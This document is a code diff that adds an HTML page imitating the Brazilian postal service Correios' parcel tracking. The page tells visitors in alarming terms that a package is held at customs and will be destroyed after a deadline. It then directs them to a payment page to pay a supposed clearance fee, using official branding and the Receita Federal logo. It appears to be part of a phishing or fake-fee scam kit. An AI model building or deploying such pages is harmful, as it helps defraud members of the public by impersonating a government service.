@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#004169">
+    <meta name="description" content="Rastreamento de Encomendas - Correios">
+    
+    <title>Sua Encomenda - Correios</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/webp" href="assets/images/favicon.webp">
+    
+    <!-- Preload critical CSS + page JS (dispara em paralelo ao HTML parse) -->
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5" as="style">
+    <link rel="preload" href="assets/css/styles.css?v=2.2.1" as="style">
+    <link rel="preload" href="assets/js/app.min.js?v=2.2.3" as="script">
+    <link rel="preload" href="assets/images/correios.webp" as="image" fetchpriority="high">
+
+    <!-- Preload critical FA fonts (parallel with CSS) -->
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-solid-900.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-regular-400.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-light-300.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
+
+    <!-- Critical CSS fallback (ANTES dos stylesheets externos). Só regras
+         estruturais — sem font-family pra não sobrescrever styles.css.
+         Stylesheets externos sobrescrevem quando carregam; se falharem,
+         este fallback mantém layout básico usável. -->
+    <style id="critical-inline">
+      *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+      html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;overflow-x:hidden}
+      body{line-height:1.5;background:#fff;color:#003f6b;min-height:100vh;display:flex;flex-direction:column}
+      img{max-width:100%;height:auto;display:block}
+      a{color:inherit;text-decoration:none}
+      button{cursor:pointer;border:0;background:none}
+      .main{flex:1;max-width:480px;margin:0 auto;padding:1rem;width:100%}
+      .header{background:#f4f6f8;border-bottom:3px solid #ffd400}
+      .header-nav{display:flex;align-items:center;justify-content:center;max-width:1200px;margin:0 auto;padding:.375rem 1rem;min-height:40px}
+      .logo-correios{height:25px;width:auto;display:block}
+      .btn-entrar{display:none}
+      .header-nav.has-user-name{justify-content:space-between}
+      .header-nav.has-user-name .btn-entrar{display:flex;align-items:center;gap:.5rem}
+      .footer{background:#fdd306;color:#1e3a5f;padding:1.5rem 1rem}
+      .footer-container{max-width:1000px;margin:0 auto}
+      .footer-links{display:none}
+      .footer-bottom{display:flex;flex-direction:column;align-items:center}
+      .footer-logos{display:flex;align-items:center;justify-content:center;gap:2rem}
+      .footer-logos .logo-footer{height:5.5rem;width:auto;max-width:100%;object-fit:contain}
+      .footer-copyright{text-align:center;font-size:.7rem;color:#014268;margin-bottom:0}
+      .loader,#loader{display:flex;align-items:center;justify-content:center;min-height:50vh}
+      [hidden]{display:none!important}
+    </style>
+    <!-- Font Awesome Pro -->
+    <link rel="stylesheet" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5">
+    
+    <!-- CSS Principal -->
+    <link rel="stylesheet" href="assets/css/styles.css?v=2.2.1">
+
+
+</head>
+<body>
+    <!-- ========================================
+         HEADER
+    ======================================== -->
+    <header class="header">
+        <nav class="header-nav" id="headerNav">
+            <a href="#" class="logo-link">
+                <img src="assets/images/correios.webp" alt="Correios" class="logo-correios" width="121" height="25" decoding="async" fetchpriority="high">
+            </a>
+            <a href="#" class="btn-entrar">
+                <img src="assets/images/entrar.svg" alt="Entrar" class="icon-entrar" width="20" height="20" decoding="async">
+                <span class="user-name">Entrar</span>
+            </a>
+        </nav>
+    </header>
+
+    <!-- ========================================
+         MAIN
+    ======================================== -->
+    <main class="main">
+        <!-- Breadcrumb -->
+        <nav class="breadcrumb">
+            <span>Portal Correios</span>
+            <i class="fal fa-angle-right"></i>
+            <span>Rastreamento</span>
+            <i class="fal fa-angle-right"></i>
+            <span class="cpf-display">---</span>
+        </nav>
+
+        <!-- Alerta Principal -->
+        <section class="alerta-principal">
+            <h2 class="alerta-titulo">
+                <i class="far fa-exclamation-triangle"></i>
+                <span>VOCÊ TEM UM PACOTE<br class="mobile-only"> RETIDO NA FISCALIZAÇÃO!</span>
+            </h2>
+        </section>
+
+        <!-- Código de Rastreio e Status -->
+        <div class="codigo-rastreio">AK 754 676 535 BR</div>
+        
+        <div class="status-pagamento">
+            <span class="status-dot"></span>
+            <span class="status-texto">AGUARDANDO PAGAMENTO</span>
+        </div>
+
+        <!-- Info Tributação -->
+        <div class="info-tributacao">
+            <p><strong>Situação:</strong> Objeto retido na fiscalização aduaneira.</p>
+            <p class="prazo-oficial"><strong>Prazo final de retenção:</strong> <span id="prazoFinal">--/--/---- às --:--</span></p>
+            <p class="texto-urgente"><strong>Atenção:</strong> Após o prazo, a Receita Federal poderá determinar a DESTRUIÇÃO ou devolução do objeto. A regularização é a única forma de garantir o recebimento.</p>
+        </div>
+        
+        <a href="pagamento.html" class="btn-pagar" id="btnPagar">
+            📦 REGULARIZAR E LIBERAR ENTREGA
+        </a>
+
+        <!-- Status da Entrega -->
+        <section class="status-entrega alerta">
+            <h3 class="status-entrega-titulo">
+                <i class="far fa-file-exclamation"></i>
+                <span>Aviso de objeto tributado:</span>
+            </h3>
+            
+            <div class="imagem-nota">
+                <img src="assets/images/nota-fiscal.webp" alt="Status da Encomenda" class="img-nota-fiscal">
+            </div>
+        </section>
+
+        <!-- Timeline de Rastreamento -->
+        <section class="timeline">
+            <!-- Previsão de Entrega -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <img src="assets/images/correios-icon.webp" alt="Correios" class="icon-correios">
+                </div>
+                <div class="timeline-content">
+                    <h4 class="timeline-titulo">Previsão de Entrega da Mercadoria</h4>
+                    <p class="timeline-data" id="previsaoEntrega">Dia --/--/----</p>
+                </div>
+            </div>
+
+            <!-- Objeto Taxado -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <i class="fal fa-usd-circle"></i>
+                </div>
+                <div class="timeline-content">
+                    <h4 class="timeline-titulo texto-vermelho">Pendência fiscal identificada</h4>
+                    <p class="timeline-descricao">Objeto aguardando regularização fiscal. Taxa de despacho pendente para liberação.</p>
+                    <p class="timeline-link">Realize o pagamento: <a href="pagamento.html" class="link-pagamento">Clique Aqui Para Efetuar o Pagamento</a></p>
+                </div>
+            </div>
+
+            <!-- Em Fiscalização -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <i class="fal fa-search"></i>
+                </div>
+                <div class="timeline-content">
+                    <h4 class="timeline-titulo">Objeto em análise fiscal</h4>
+                    <p class="timeline-descricao">Encaminhado para Unidade de Fiscalização. Aguardando verificação tributária.</p>
+                </div>
+            </div>
+
+            <!-- Em Transferência -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <i class="fal fa-truck"></i>
+                </div>
+                <div class="timeline-content">
+                    <h4 class="timeline-titulo">Objeto em transferência</h4>
+                    <p class="timeline-descricao">Em trânsito para Unidade de Tratamento. Processamento em andamento.</p>
+                </div>
+            </div>
+
+            <!-- Recebido -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <i class="fal fa-truck-loading"></i>
+                </div>
+                <div class="timeline-content">
+                    <h4 class="timeline-titulo">Objeto recebido na unidade</h4>
+                    <p class="timeline-descricao">O objeto foi recebido e está passando por triagem, aguardando processamento.</p>
+                </div>
+            </div>
+
+            <!-- Objeto Postado -->
+            <div class="timeline-item">
+                <div class="timeline-icon">
+                    <i class="fal fa-box-alt"></i>
+                </div>
+                <div class="timeline-content">
+                    <h4 class="timeline-titulo">Objeto Postado</h4>
+                    <p class="timeline-descricao">Objeto coletado e registrado no sistema</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Banner Carrossel -->
+        <section class="banner-section">
+            <div class="carousel">
+                <div class="carousel-inner">
+                    <div class="carousel-slide active">
+                        <img src="assets/images/banner.webp" alt="Correios" class="banner-img" fetchpriority="high">
+                    </div>
+                    <div class="carousel-slide">
+                        <img src="assets/images/banner2.webp" alt="Correios" class="banner-img" loading="lazy" fetchpriority="low">
+                    </div>
+                    <div class="carousel-slide">
+                        <img src="assets/images/banner3.webp" alt="Correios" class="banner-img" loading="lazy" fetchpriority="low">
+                    </div>
+                </div>
+                <button class="carousel-btn carousel-btn-prev" aria-label="Anterior">
+                    <i class="fas fa-chevron-left"></i>
+                </button>
+                <button class="carousel-btn carousel-btn-next" aria-label="Próximo">
+                    <i class="fas fa-chevron-right"></i>
+                </button>
+                <div class="carousel-indicators">
+                    <button class="carousel-indicator active" data-slide="0" aria-label="Slide 1"></button>
+                    <button class="carousel-indicator" data-slide="1" aria-label="Slide 2"></button>
+                    <button class="carousel-indicator" data-slide="2" aria-label="Slide 3"></button>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- ========================================
+         FOOTER
+    ======================================== -->
+    <footer class="footer">
+        <div class="footer-container">
+            <!-- Links do Footer -->
+            <div class="footer-links">
+                <div class="footer-section">
+                    <h4>Fale Conosco</h4>
+                    <ul>
+                        <li><i class="far fa-desktop"></i> Registro de Manifestações</li>
+                        <li><i class="far fa-question-square"></i> Central de Atendimento</li>
+                        <li><i class="far fa-briefcase"></i> Soluções para o seu negócio</li>
+                        <li><i class="far fa-headset"></i> Suporte ao cliente com contrato</li>
+                        <li><i class="far fa-comment-alt-dots"></i> Ouvidoria</li>
+                        <li><i class="far fa-user-headset"></i> Denúncia</li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>Sobre os Correios</h4>
+                    <ul>
+                        <li><i class="far fa-address-card"></i> Identidade corporativa</li>
+                        <li><i class="far fa-user-graduate"></i> Educação e cultura</li>
+                        <li><i class="far fa-book-alt"></i> Código de ética</li>
+                        <li><i class="far fa-comment-alt-dots"></i> Política de privacidade e Notas legais</li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>Outros Sites</h4>
+                    <ul>
+                        <li><i class="far fa-shopping-cart"></i> Loja online dos correios</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Logo e Copyright -->
+            <div class="footer-bottom">
+                <div class="footer-logos">
+                    <img src="assets/images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer" width="383" height="88" decoding="async">
+                </div>
+                <p class="footer-copyright">© Copyright 2026 Correios<br>CNPJ 34.028.316/0001-03</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript Principal -->
+    <script src="assets/js/app.min.js?v=2.2.3" defer></script></body>
+</html>
+
